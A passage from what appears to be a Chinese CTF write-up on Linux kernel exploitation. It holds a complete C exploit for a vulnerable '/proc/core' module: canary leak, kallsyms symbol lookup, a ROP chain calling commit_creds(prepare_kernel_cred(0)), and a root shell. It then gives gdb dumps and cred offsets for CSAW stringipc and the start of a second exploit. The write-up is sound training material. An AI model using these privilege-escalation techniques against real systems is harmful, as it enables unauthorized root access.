&#125; if(strstr(buf,"commit_creds") &amp;&amp; !commit_creds_addr)&#123; char addr1[20] = &#123;0&#125;; strncpy(addr1,buf,16); sscanf(addr1,"%llx",&amp;commit_creds_addr); printf("[:)]commit_creds addr = %p\n",commit_creds_addr); &#125; if(strstr(buf,"prepare_kernel_cred") &amp;&amp; !prepare_kernel_cred_addr)&#123; char addr2[20] = &#123;0&#125;; strncpy(addr2,buf,16); sscanf(addr2,"%llx",&amp;prepare_kernel_cred_addr); printf("[:)]prepare_kernel_cred addr = %p\n",prepare_kernel_cred_addr); vmlinux_base = prepare_kernel_cred_addr - 0x9cce0; printf("[:)]vmlinux_base = %p\n",vmlinux_base); &#125; &#125; if(!(commit_creds_addr &amp; prepare_kernel_cred_addr))&#123; puts("[:(]Don't find!!!"); exit(0); &#125; fclose(fp);&#125;size_t user_ss,user_cs,user_rflags,user_rsp;void save()&#123; __asm__( "mov user_ss,ss;" "mov user_cs,cs;" "mov user_rsp,rsp;" "pushf;" "pop user_rflags;" ); puts("[:)]Status has been saved!!!");&#125;void get_root()&#123; char* (*pkc)(int) = prepare_kernel_cred_addr; void (*cc)(char*) = commit_creds_addr; (*cc)((*pkc)(0));&#125;void get_shell()&#123; if(getuid() == 0)&#123; puts("[:)]root now!!!"); system("/bin/sh"); exit(0); &#125; else&#123; puts("[:(]get root failed..."); exit(0); &#125;&#125;void set_offset(int fd, size_t offset)&#123; ioctl(fd,0x6677889C,offset); puts("[:)]Set offset!!!");&#125;void Read(int fd, char buf[])&#123; ioctl(fd,0x6677889B,buf); puts("[:)]Read!!!");&#125;void copy_func(int fd, signed long long size)&#123; ioctl(fd,0x6677889A,size); puts("[:)]Copy_data!!!");&#125;int main()&#123; save(); get_symbols(); int fd = open("/proc/core",2); if(fd &lt; 0)&#123; puts("[:(]Open /proc/core failed!!!"); exit(0); &#125; set_offset(fd, 0x40); char buf[0x40] = &#123;0&#125;; Read(fd, buf); size_t canary = *(size_t *)buf; printf("[:)]Canary = %llx\n",canary); size_t ropchain[100] = &#123;0&#125;; size_t swapgs = vmlinux_base + (0xffffffff81a012da-0xffffffff81000000); //: swapgs; popfq; ret; size_t iretq = vmlinux_base + (0xffffffff81050ac2-0xffffffff81000000); //: iretq; ret; int i = 0; for(i = 0;i &lt; 8;i++)&#123; ropchain[i] = 0; &#125; ropchain[i++] = canary; ropchain[i++] = 0; ropchain[i++] = (size_t)get_root; ropchain[i++] = swapgs; ropchain[i++] = 0; ropchain[i++] = iretq; ropchain[i++] = (size_t)get_shell; ropchain[i++] = user_cs; ropchain[i++] = user_rflags; ropchain[i++] = user_rsp; ropchain[i++] = user_ss; write(fd,ropchain,0x100); copy_func(fd,0xffffffffffff0000|0x0100); return 0;&#125;/*&gt;&gt;&gt; hex(p.sym['commit_creds']-0xffffffff81000000)'0x9c8e0'&gt;&gt;&gt; hex(p.sym['prepare_kernel_cred']-0xffffffff81000000)'0x9cce0'*/ 2015CSAW_stringipc即使有源码还是看了快一天，关于内核的知识了解的实在太少，不过做题本就是次要，积累知识才是现阶段的首要目的。 解法一：写主线程的cred结构体 task_struct &amp;&amp; thread_info &amp;&amp; cred：细节可参考： https://blog.csdn.net/gatieme/article/details/51383272 我使用源码调试，在泄露了cred的地址之后，在内存中找到了完整的task_struct，并确定了一些重要变量的偏移： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689690691692693694695696697698699700701702703704705706707708gdb-peda$ p (struct task_struct)*0xffff88000f842980$6 = &#123; state = 0x0, stack = 0xffff88000f5f4000, //important usage = &#123; counter = 0x2 &#125;, flags = 0x404000, ptrace = 0x0, wake_entry = &#123; next = 0x0 &lt;irq_stack_union&gt; &#125;, on_cpu = 0x1, wakee_flips = 0x18, wakee_flip_decay_ts = 0xfffee692, last_wakee = 0xffff88000d7ae7c0, wake_cpu = 0x0, on_rq = 0x1, prio = 0x78, static_prio = 0x78, normal_prio = 0x78, rt_priority = 0x0, sched_class = 0xffffffff81a276a0 &lt;fair_sched_class&gt;, se = &#123; load = &#123; weight = 0x400, inv_weight = 0x400000 &#125;, run_node = &#123; __rb_parent_color = 0x1, rb_right = 0x0 &lt;irq_stack_union&gt;, rb_left = 0x0 &lt;irq_stack_union&gt; &#125;, group_node = &#123; next = 0xffff88000de176e8, prev = 0xffff88000de176e8 &#125;, on_rq = 0x1, exec_start = 0x30d1efc3f, sum_exec_runtime = 0x7049fb2d, vruntime = 0x781cf582, prev_sum_exec_runtime = 0x5f2b1a44, nr_migrations = 0x0, statistics = &#123; wait_start = 0x0, wait_max = 0x1c85687, wait_count = 0xc, wait_sum = 0x260560b, iowait_count = 0x0, iowait_sum = 0x0, sleep_start = 0x0, sleep_max = 0x0, sum_sleep_runtime = 0x0, block_start = 0x0, block_max = 0x0, exec_max = 0xdf59ea, slice_max = 0x1cd26bd, nr_migrations_cold = 0x0, nr_failed_migrations_affine = 0x0, nr_failed_migrations_running = 0x0, nr_failed_migrations_hot = 0x0, nr_forced_migrations = 0x0, nr_wakeups = 0x0, nr_wakeups_sync = 0x0, nr_wakeups_migrate = 0x0, nr_wakeups_local = 0x0, nr_wakeups_remote = 0x0, nr_wakeups_affine = 0x0, nr_wakeups_affine_attempts = 0x0, nr_wakeups_passive = 0x0, nr_wakeups_idle = 0x0 &#125;, depth = 0x1, parent = 0xffff88000fa3d800, cfs_rq = 0xffff88000fa3d600, my_q = 0x0 &lt;irq_stack_union&gt;, avg = &#123; last_update_time = 0x30d1efc3f, load_sum = 0x2e0fef5, util_sum = 0x2e0f67d, period_contrib = 0x1a2, load_avg = 0x3f3, util_avg = 0x3f3 &#125; &#125;, rt = &#123; run_list = &#123; next = 0xffff88000f842b68, prev = 0xffff88000f842b68 &#125;, timeout = 0x0, watchdog_stamp = 0x0, time_slice = 0x19, back = 0x0 &lt;irq_stack_union&gt; &#125;, sched_task_group = 0xffff88000fa3d400, dl = &#123; rb_node = &#123; __rb_parent_color = 0xffff88000f842ba0, rb_right = 0x0 &lt;irq_stack_union&gt;, rb_left = 0x0 &lt;irq_stack_union&gt; &#125;, dl_runtime = 0x0, dl_deadline = 0x0, dl_period = 0x0, dl_bw = 0x0, runtime = 0x0, deadline = 0x0, flags = 0x0, dl_throttled = 0x0, dl_new = 0x1, dl_boosted = 0x0, dl_yielded = 0x0, dl_timer = &#123; node = &#123; node = &#123; __rb_parent_color = 0xffff88000f842c00, rb_right = 0x0 &lt;irq_stack_union&gt;, rb_left = 0x0 &lt;irq_stack_union&gt; &#125;, expires = &#123; tv64 = 0x0 &#125; &#125;, _softexpires = &#123; tv64 = 0x0 &#125;, function = 0xffffffff810c2bd0 &lt;dl_task_timer&gt;, base = 0xffff88000de11440, state = 0x0, is_rel = 0x0 &#125; &#125;, preempt_notifiers = &#123; first = 0x0 &lt;irq_stack_union&gt; &#125;, btrace_seq = 0x0, policy = 0x0, nr_cpus_allowed = 0x1, cpus_allowed = &#123; bits = &#123;0x1, 0xffffffffffffffff &lt;repeats 127 times&gt;&#125; &#125;, sched_info = &#123; pcount = 0xc, run_delay = 0x260560b, last_arrival = 0x2fc001b56, last_queued = 0x0 &#125;, tasks = &#123; next = 0xffffffff81e13bf8 &lt;init_task+1784&gt;, prev = 0xffff88000f844538 &#125;, pushable_tasks = &#123; prio = 0x8c, prio_list = &#123; next = 0xffff88000f843090, prev = 0xffff88000f843090 &#125;, node_list = &#123; next = 0xffff88000f8430a0, prev = 0xffff88000f8430a0 &#125; &#125;, pushable_dl_tasks = &#123; __rb_parent_color = 0xffff88000f8430b0, rb_right = 0x0 &lt;irq_stack_union&gt;, rb_left = 0x0 &lt;irq_stack_union&gt; &#125;, mm = 0xffff88000fa39f00, //important active_mm = 0xffff88000fa39f00, //important vmacache_seqnum = 0x0, vmacache = &#123;0xffff88000fa6e9c0, 0xffff88000fa6ecc0, 0xffff88000fa6e900, 0xffff88000fa6eb40&#125;, rss_stat = &#123; events = 0x18, count = &#123;0xb1, 0xb, 0x0&#125; &#125;, exit_state = 0x0, exit_code = 0x0, exit_signal = 0x11, pdeath_signal = 0x0, jobctl = 0x0, personality = 0x0, sched_reset_on_fork = 0x0, sched_contributes_to_load = 0x0, sched_migrated = 0x0, in_execve = 0x0, in_iowait = 0x0, memcg_may_oom = 0x0, no_cgroup_migration = 0x0, atomic_flags = 0x0, restart_block = &#123; fn = 0xffffffff81090750 &lt;do_no_restart_syscall&gt;, &#123; futex = &#123; uaddr = 0x0 &lt;irq_stack_union&gt;, val = 0x0, flags = 0x0, bitset = 0x0, time = 0x0, uaddr2 = 0x0 &lt;irq_stack_union&gt; &#125;, nanosleep = &#123; clockid = 0x0, rmtp = 0x0 &lt;irq_stack_union&gt;, compat_rmtp = 0x0 &lt;irq_stack_union&gt;, expires = 0x0 &#125;, poll = &#123; ufds = 0x0 &lt;irq_stack_union&gt;, nfds = 0x0, has_timeout = 0x0, tv_sec = 0x0, tv_nsec = 0x0 &#125; &#125; &#125;, pid = 0x7c, tgid = 0x7c, stack_canary = 0x2e1bb4e394e40bee, //important real_parent = 0xffff88000f843e40, parent = 0xffff88000f843e40, children = &#123; next = 0xffff88000f843190, prev = 0xffff88000f843190 &#125;, sibling = &#123; next = 0xffff88000f844650, prev = 0xffff88000f844650 &#125;, group_leader = 0xffff88000f842980, ptraced = &#123; next = 0xffff88000f8431b8, prev = 0xffff88000f8431b8 &#125;, ptrace_entry = &#123; next = 0xffff88000f8431c8, prev = 0xffff88000f8431c8 &#125;, pids = &#123;&#123; node = &#123; next = 0x0 &lt;irq_stack_union&gt;, pprev = 0xffff88000092cd88 &#125;, pid = 0xffff88000092cd80 &#125;, &#123; node = &#123; next = 0x0 &lt;irq_stack_union&gt;, pprev = 0xffff88000092cd90 &#125;, pid = 0xffff88000092cd80 &#125;, &#123; node = &#123; next = 0xffff88000f8446c8, pprev = 0xffff88000092ce98 &#125;, pid = 0xffff88000092ce80 &#125;&#125;, thread_group = &#123; next = 0xffff88000f843220, prev = 0xffff88000f843220 &#125;, thread_node = &#123; next = 0xffff88000f8c1dd0, prev = 0xffff88000f8c1dd0 &#125;, vfork_done = 0x0 &lt;irq_stack_union&gt;, set_child_tid = 0x7f49077a9a10, clear_child_tid = 0x0 &lt;irq_stack_union&gt;, utime = 0xb6, stime = 0x10d, utimescaled = 0xb6, stimescaled = 0x10d, gtime = 0x0, prev_cputime = &#123; utime = 0x0, stime = 0x0, lock = &#123; raw_lock = &#123; val = &#123; counter = 0x0 &#125; &#125; &#125; &#125;, nvcsw = 0x0, nivcsw = 0xb, start_time = 0x29a6ee377, real_start_time = 0x29a6ee83a, min_flt = 0x31, maj_flt = 0x0, cputime_expires = &#123; utime = 0x0, stime = 0x0, sum_exec_runtime = 0x0 &#125;, cpu_timers = &#123;&#123; next = 0xffff88000f8432e0, prev = 0xffff88000f8432e0 &#125;, &#123; next = 0xffff88000f8432f0, prev = 0xffff88000f8432f0 &#125;, &#123; next = 0xffff88000f843300, prev = 0xffff88000f843300 &#125;&#125;, ptracer_cred = 0x0 &lt;irq_stack_union&gt;, real_cred = 0xffff88000faa00c0, //This is our target cred = 0xffff88000faa00c0, //This is our target comm = "this_is_xxrw...", //This is our target nameidata = 0x0 &lt;irq_stack_union&gt;, sysvsem = &#123; undo_list = 0x0 &lt;irq_stack_union&gt; &#125;, sysvshm = &#123; shm_clist = &#123; next = 0xffff88000f843348, prev = 0xffff88000f843348 &#125; &#125;, last_switch_count = 0x0, fs = 0xffff88000fa21ac0, files = 0xffff88000d61e840, nsproxy = 0xffffffff81e4db40 &lt;init_nsproxy&gt;, signal = 0xffff88000f8c1dc0, sighand = 0xffff88000fa33180, blocked = &#123; sig = &#123;0x0&#125; &#125;, real_blocked = &#123; sig = &#123;0x0&#125; &#125;, saved_sigmask = &#123; sig = &#123;0x0&#125; &#125;, pending = &#123; list = &#123; next = 0xffff88000f8433a0, prev = 0xffff88000f8433a0 &#125;, signal = &#123; sig = &#123;0x0&#125; &#125; &#125;, sas_ss_sp = 0x0, sas_ss_size = 0x0, task_works = 0x0 &lt;irq_stack_union&gt;, audit_context = 0x0 &lt;irq_stack_union&gt;, loginuid = &#123; val = 0xffffffff &#125;, sessionid = 0xffffffff, seccomp = &#123; mode = 0x0, filter = 0x0 &lt;irq_stack_union&gt; &#125;, parent_exec_id = 0x5, self_exec_id = 0x6, alloc_lock = &#123; &#123; rlock = &#123; raw_lock = &#123; val = &#123; counter = 0x0 &#125; &#125; &#125; &#125; &#125;, pi_lock = &#123; raw_lock = &#123; val = &#123; counter = 0x0 &#125; &#125; &#125;, wake_q = &#123; next = 0x0 &lt;irq_stack_union&gt; &#125;, pi_waiters = &#123; rb_node = 0x0 &lt;irq_stack_union&gt; &#125;, pi_waiters_leftmost = 0x0 &lt;irq_stack_union&gt;, pi_blocked_on = 0x0 &lt;irq_stack_union&gt;, journal_info = 0x0 &lt;irq_stack_union&gt;, bio_list = 0x0 &lt;irq_stack_union&gt;, plug = 0x0 &lt;irq_stack_union&gt;, reclaim_state = 0x0 &lt;irq_stack_union&gt;, backing_dev_info = 0x0 &lt;irq_stack_union&gt;, io_context = 0x0 &lt;irq_stack_union&gt;, ptrace_message = 0x0, last_siginfo = 0x0 &lt;irq_stack_union&gt;, ioac = &#123; rchar = 0x1d0, wchar = 0xde, syscr = 0x2, syscw = 0x8, read_bytes = 0x0, write_bytes = 0x0, cancelled_write_bytes = 0x0 &#125;, acct_rss_mem1 = 0x1b86e0, acct_vm_mem1 = 0x1e25c600, acct_timexpd = 0x1c3, mems_allowed = &#123; bits = &#123;0x1, 0x0 &lt;repeats 15 times&gt;&#125; &#125;, mems_allowed_seq = &#123; sequence = 0x0 &#125;, cpuset_mem_spread_rotor = 0xffffffff, cpuset_slab_spread_rotor = 0xffffffff, cgroups = 0xffffffff81e7b040 &lt;init_css_set&gt;, cg_list = &#123; next = 0xffff88000f843548, prev = 0xffff88000f843548 &#125;, robust_list = 0x0 &lt;irq_stack_union&gt;, compat_robust_list = 0x0 &lt;irq_stack_union&gt;, pi_state_list = &#123; next = 0xffff88000f843568, prev = 0xffff88000f843568 &#125;, pi_state_cache = 0x0 &lt;irq_stack_union&gt;, perf_event_ctxp = &#123;0x0 &lt;irq_stack_union&gt;, 0x0 &lt;irq_stack_union&gt;&#125;, perf_event_mutex = &#123; count = &#123; counter = 0x1 &#125;, wait_lock = &#123; &#123; rlock = &#123; raw_lock = &#123; val = &#123; counter = 0x0 &#125; &#125; &#125; &#125; &#125;, wait_list = &#123; next = 0xffff88000f843598, prev = 0xffff88000f843598 &#125;, owner = 0x0 &lt;irq_stack_union&gt;, osq = &#123; tail = &#123; counter = 0x0 &#125; &#125; &#125;, perf_event_list = &#123; next = 0xffff88000f8435b8, prev = 0xffff88000f8435b8 &#125;, mempolicy = 0x0 &lt;irq_stack_union&gt;, il_next = 0x0, pref_node_fork = 0x0, numa_scan_seq = 0x0, numa_scan_period = 0x3e8, numa_scan_period_max = 0x0, numa_preferred_nid = 0xffffffff, numa_migrate_retry = 0x0, node_stamp = 0x0, last_task_numa_placement = 0x0, last_sum_exec_runtime = 0x0, numa_work = &#123; next = 0xffff88000f843608, func = 0x0 &lt;irq_stack_union&gt; &#125;, numa_entry = &#123; next = 0x0 &lt;irq_stack_union&gt;, prev = 0x0 &lt;irq_stack_union&gt; &#125;, numa_group = 0x0 &lt;irq_stack_union&gt;, numa_faults = 0x0 &lt;irq_stack_union&gt;, total_numa_faults = 0x0, numa_faults_locality = &#123;0x0, 0x0, 0x0&#125;, numa_pages_migrated = 0x0, tlb_ubc = &#123; cpumask = &#123; bits = &#123;0x0 &lt;repeats 128 times&gt;&#125; &#125;, flush_required = 0x0, writable = 0x0 &#125;, rcu = &#123; next = 0x0 &lt;irq_stack_union&gt;, func = 0x0 &lt;irq_stack_union&gt; &#125;, splice_pipe = 0x0 &lt;irq_stack_union&gt;, task_frag = &#123; page = 0x0 &lt;irq_stack_union&gt;, offset = 0x0, size = 0x0 &#125;, delays = 0xffff88000fa21fc0, nr_dirtied = 0x0, nr_dirtied_pause = 0x20, dirty_paused_when = 0x0, timer_slack_ns = 0xc350, default_timer_slack_ns = 0xc350, curr_ret_stack = 0xffffffff, ret_stack = 0x0 &lt;irq_stack_union&gt;, ftrace_timestamp = 0x0, trace_overrun = &#123; counter = 0x0 &#125;, tracing_graph_pause = &#123; counter = 0x0 &#125;, trace = 0x0, trace_recursion = 0x0, memcg_in_oom = 0x0 &lt;irq_stack_union&gt;, memcg_oom_gfp_mask = 0x0, memcg_oom_order = 0x0, memcg_nr_pages_over_high = 0x0, sequential_io = 0x0, sequential_io_avg = 0x0, pagefault_disabled = 0x0, thread = &#123; tls_array = &#123;&#123; &#123; &#123; a = 0x4880ffff, b = 0xdff2ff &#125;, &#123; limit0 = 0xffff, base0 = 0x4880, base1 = 0xff, type = 0x2, s = 0x1, dpl = 0x3, p = 0x1, limit = 0xf, avl = 0x1, l = 0x0, d = 0x1, g = 0x1, base2 = 0x0 &#125; &#125; &#125;, &#123; &#123; &#123; a = 0x0, b = 0x0 &#125;, &#123; limit0 = 0x0, base0 = 0x0, base1 = 0x0, type = 0x0, s = 0x0, dpl = 0x0, p = 0x0, limit = 0x0, avl = 0x0, l = 0x0, d = 0x0, g = 0x0, base2 = 0x0 &#125; &#125; &#125;, &#123; &#123; &#123; a = 0x0, b = 0x0 &#125;, &#123; limit0 = 0x0, base0 = 0x0, base1 = 0x0, type = 0x0, s = 0x0, dpl = 0x0, p = 0x0, limit = 0x0, avl = 0x0, l = 0x0, d = 0x0, g = 0x0, base2 = 0x0 &#125; &#125; &#125;&#125;, sp0 = 0xffff88000f5f8000, sp = 0xffff88000f5f7e98, es = 0x0, ds = 0x0, fsindex = 0x63, gsindex = 0x0, fs = 0x0, gs = 0x0, ptrace_bps = &#123;0x0 &lt;irq_stack_union&gt;, 0x0 &lt;irq_stack_union&gt;, 0x0 &lt;irq_stack_union&gt;, 0x0 &lt;irq_stack_union&gt;&#125;, debugreg6 = 0x0, ptrace_dr7 = 0x0, cr2 = 0x0, trap_nr = 0x0, error_code = 0x0, io_bitmap_ptr = 0x0 &lt;irq_stack_union&gt;, iopl = 0x0, io_bitmap_max = 0x0, fpu = &#123; last_cpu = 0x0, fpstate_active = 0x1, fpregs_active = 0x1, counter = 0x6, state = &#123; fsave = &#123; cwd = 0x37f, swd = 0x0, twd = 0x0, fip = 0x0, fcs = 0x0, foo = 0x0, fos = 0x1f80, st_space = &#123;0xffff, 0x0 &lt;repeats 19 times&gt;&#125;, status = 0x0 &#125;, fxsave = &#123; cwd = 0x37f, swd = 0x0, twd = 0x0, fop = 0x0, &#123; &#123; rip = 0x0, rdp = 0x0 &#125;, &#123; fip = 0x0, fcs = 0x0, foo = 0x0, fos = 0x0 &#125; &#125;, mxcsr = 0x1f80, mxcsr_mask = 0xffff, st_space = &#123;0x0 &lt;repeats 32 times&gt;&#125;, xmm_space = &#123;0xff, 0x0, 0x0, 0x0, 0x74747474, 0x74747474, 0x74747474, 0x74747474, 0x0 &lt;repeats 13 times&gt;, 0xff000000, 0x0, 0x0, 0x0, 0x0, 0xff, 0xff0000, 0x0 &lt;repeats 36 times&gt;&#125;, padding = &#123;0x0 &lt;repeats 12 times&gt;&#125;, &#123; padding1 = &#123;0x0 &lt;repeats 12 times&gt;&#125;, sw_reserved = &#123;0x0 &lt;repeats 12 times&gt;&#125; &#125; &#125;, soft = &#123; cwd = 0x37f, swd = 0x0, twd = 0x0, fip = 0x0, fcs = 0x0, foo = 0x0, fos = 0x1f80, st_space = &#123;0xffff, 0x0 &lt;repeats 19 times&gt;&#125;, ftop = 0x0, changed = 0x0, lookahead = 0x0, no_update = 0x0, rm = 0x0, alimit = 0x0, info = 0x0 &lt;irq_stack_union&gt;, entry_eip = 0x0 &#125;, xsave = &#123; i387 = &#123; cwd = 0x37f, swd = 0x0, twd = 0x0, fop = 0x0, &#123; &#123; rip = 0x0, rdp = 0x0 &#125;, &#123; fip = 0x0, fcs = 0x0, foo = 0x0, fos = 0x0 &#125; &#125;, mxcsr = 0x1f80, mxcsr_mask = 0xffff, st_space = &#123;0x0 &lt;repeats 32 times&gt;&#125;, xmm_space = &#123;0xff, 0x0, 0x0, 0x0, 0x74747474, 0x74747474, 0x74747474, 0x74747474, 0x0 &lt;repeats 13 times&gt;, 0xff000000, 0x0, 0x0, 0x0, 0x0, 0xff, 0xff0000, 0x0 &lt;repeats 36 times&gt;&#125;, padding = &#123;0x0 &lt;repeats 12 times&gt;&#125;, &#123; padding1 = &#123;0x0 &lt;repeats 12 times&gt;&#125;, sw_reserved = &#123;0x0 &lt;repeats 12 times&gt;&#125; &#125; &#125;, header = &#123; xfeatures = 0x1, xcomp_bv = 0xffff88000fabc000, reserved = &#123;0x40410000000002, 0x0, 0x0, 0x2700000000, 0xfffee570, 0xffff88000d700000&#125; &#125;, extended_state_area = 0xffff88000f843e80 "" &#125;, __padding = "\177\003", '\000' &lt;repeats 22 times&gt;, "\200\037\000\000\377\377", '\000' &lt;repeats 130 times&gt;, "\377", '\000' &lt;repeats 15 times&gt;, 't' &lt;repeats 16 times&gt;, '\000' &lt;repeats 55 times&gt;... &#125; &#125; &#125;&#125; 找到了real_cred，cred和comm相对于task_struct结构体开头的偏移。 12345task_struct_begin = 0xffff88000f842980stack_ptr_addr = 0xffff88000f842988 offset = 0x8real_cred_addr = 0xffff88000f843318 offset = 0x998cred_addr = 0xffff88000f843320 offset = 0x9a0comm = 0xffff88000f843328 offset = 0x9a8 我们还可以看到stack指针值为0xffff88000f5f4000。stack指针指向thread_union结构体。 12345union thread_union&#123; struct thread_info thread_info; unsigned long stack[THREAD_SIZE/sizeof(long)];&#125;; 123456789struct thread_info &#123; struct task_struct *task; /* main task structure */ __u32 flags; /* low level flags */ __u32 status; /* thread synchronous flags */ __u32 cpu; /* current CPU */ mm_segment_t addr_limit; unsigned int sig_on_uaccess_error:1; unsigned int uaccess_err:1; /* uaccess failed */&#125;; 其中thread_info是一个大小为0x28的结构体。其之后进程的内核栈。 在内核的某个特定组建使用了较多的栈空间时, 内核栈会溢出到thread_info部分, 因此内核提供了kstack_end函数来判断给出的地址是否位于栈的有效部分 123456789#ifndef __HAVE_ARCH_KSTACK_ENDstatic inline int kstack_end(void *addr)&#123; /* Reliable end of stack detection: * Some APM bios versions misalign the stack */ return !(((unsigned long)addr+sizeof(void*)-1) &amp; (THREAD_SIZE-sizeof(void*)));&#125;#endif 进程的创建：https://blog.csdn.net/gatieme/article/details/51569932 我们用_do_fork创建进程的时候, 提到dup_task_struct会复制父进程的task_struct和thread_info实例的内容, 但是stack则与新的thread_info实例位于同一个内存, 这意味着父子进程的task_struct此时除了栈指针之外完全相同。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768gdb-peda$ x/100xg 0xffff88000f5f40000xffff88000f5f4000: 0xffff88000f842980 0x00000000000000000xffff88000f5f4010: 0x0000000000000000 0x00007ffffffff0000xffff88000f5f4020: 0x0000000000000000 0x0000000057ac6e9d0xffff88000f5f4030: 0xcccccccccccccccc 0xcccccccccccccccc0xffff88000f5f4040: 0xcccccccccccccccc 0xcccccccccccccccc0xffff88000f5f4050: 0xcccccccccccccccc 0xcccccccccccccccc0xffff88000f5f4060: 0xcccccccccccccccc 0xcccccccccccccccc0xffff88000f5f4070: 0xcccccccccccccccc 0xcccccccccccccccc0xffff88000f5f4080: 0xcccccccccccccccc 0xcccccccccccccccc0xffff88000f5f4090: 0xcccccccccccccccc 0xcccccccccccccccc0xffff88000f5f40a0: 0xcccccccccccccccc 0xcccccccccccccccc0xffff88000f5f40b0: 0xcccccccccccccccc 0xcccccccccccccccc0xffff88000f5f40c0: 0xcccccccccccccccc 0xcccccccccccccccc0xffff88000f5f40d0: 0xcccccccccccccccc 0xcccccccccccccccc0xffff88000f5f40e0: 0xcccccccccccccccc 0xcccccccccccccccc0xffff88000f5f40f0: 0xcccccccccccccccc 0xcccccccccccccccc0xffff88000f5f4100: 0xcccccccccccccccc 0xcccccccccccccccc0xffff88000f5f4110: 0xcccccccccccccccc 0xcccccccccccccccc0xffff88000f5f4120: 0xcccccccccccccccc 0xcccccccccccccccc0xffff88000f5f4130: 0xcccccccccccccccc 0xcccccccccccccccc0xffff88000f5f4140: 0xcccccccccccccccc 0xcccccccccccccccc0xffff88000f5f4150: 0xcccccccccccccccc 0xcccccccccccccccc0xffff88000f5f4160: 0xcccccccccccccccc 0xcccccccccccccccc0xffff88000f5f4170: 0xcccccccccccccccc 0xcccccccccccccccc0xffff88000f5f4180: 0xcccccccccccccccc 0xcccccccccccccccc0xffff88000f5f4190: 0xcccccccccccccccc 0xcccccccccccccccc0xffff88000f5f41a0: 0xcccccccccccccccc 0xcccccccccccccccc0xffff88000f5f41b0: 0xcccccccccccccccc 0xcccccccccccccccc0xffff88000f5f41c0: 0xcccccccccccccccc 0xcccccccccccccccc0xffff88000f5f41d0: 0xcccccccccccccccc 0xcccccccccccccccc0xffff88000f5f41e0: 0xcccccccccccccccc 0xcccccccccccccccc0xffff88000f5f41f0: 0xcccccccccccccccc 0xcccccccccccccccc0xffff88000f5f4200: 0xcccccccccccccccc 0xcccccccccccccccc0xffff88000f5f4210: 0xcccccccccccccccc 0xcccccccccccccccc0xffff88000f5f4220: 0xcccccccccccccccc 0xcccccccccccccccc0xffff88000f5f4230: 0xcccccccccccccccc 0xcccccccccccccccc0xffff88000f5f4240: 0xcccccccccccccccc 0xcccccccccccccccc0xffff88000f5f4250: 0xcccccccccccccccc 0xcccccccccccccccc0xffff88000f5f4260: 0xcccccccccccccccc 0xcccccccccccccccc0xffff88000f5f4270: 0xcccccccccccccccc 0xcccccccccccccccc0xffff88000f5f4280: 0xcccccccccccccccc 0xcccccccccccccccc0xffff88000f5f4290: 0xcccccccccccccccc 0xcccccccccccccccc0xffff88000f5f42a0: 0xcccccccccccccccc 0xcccccccccccccccc0xffff88000f5f42b0: 0xcccccccccccccccc 0xcccccccccccccccc0xffff88000f5f42c0: 0xcccccccccccccccc 0xcccccccccccccccc0xffff88000f5f42d0: 0xcccccccccccccccc 0xcccccccccccccccc0xffff88000f5f42e0: 0xcccccccccccccccc 0xcccccccccccccccc0xffff88000f5f42f0: 0xcccccccccccccccc 0xcccccccccccccccc0xffff88000f5f4300: 0xcccccccccccccccc 0xcccccccccccccccc0xffff88000f5f4310: 0xcccccccccccccccc 0xcccccccccccccccc gdb-peda$ p $rsp$8 = (void *) 0xffff88000f5f7f50 gdb-peda$ p (struct thread_info)*0xffff88000f5f4000$7 = &#123; task = 0xffff88000f842980, flags = 0x0, status = 0x0, cpu = 0x0, addr_limit = &#123; seg = 0x7ffffffff000 &#125;, sig_on_uaccess_error = 0x0, uaccess_err = 0x0&#125; 参考：https://github.com/gatieme/LDD-LinuxDeviceDrivers/blob/master/study/kernel/01-process/02-create/06-thread_info/README.md exp：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;fcntl.h&gt;#define CSAW_IOCTL_BASE 0x77617363#define CSAW_ALLOC_CHANNEL CSAW_IOCTL_BASE+1#define CSAW_OPEN_CHANNEL CSAW_IOCTL_BASE+2#define CSAW_GROW_CHANNEL CSAW_IOCTL_BASE+3#define CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE+4#define CSAW_READ_CHANNEL CSAW_IOCTL_BASE+5#define CSAW_WRITE_CHANNEL CSAW_IOCTL_BASE+6#define CSAW_SEEK_CHANNEL CSAW_IOCTL_BASE+7#define CSAW_CLOSE_CHANNEL CSAW_IOCTL_BASE+8struct alloc_channel_args &#123; size_t buf_size; int id;&#125;;struct open_channel_args &#123; int id;&#125;;struct grow_channel_args &#123; int id; size_t size;&#125;;struct shrink_channel_args &#123; int id; size_t size;&#125;;struct read_channel_args &#123; int id; char *buf; size_t count;&#125;;struct write_channel_args &#123; int id; char *buf; size_t count;&#125;;struct seek_channel_args &#123; int id; loff_t index; int whence;&#125;;struct close_channel_args &#123; int id;&#125;;int main()&#123; size_t cred_addr = 0; setvbuf(stdout,0LL,2,0LL); char fake_str[16]; strcpy(fake_str,"this_is_xxrw..."); prctl(PR_SET_NAME,fake_str); int 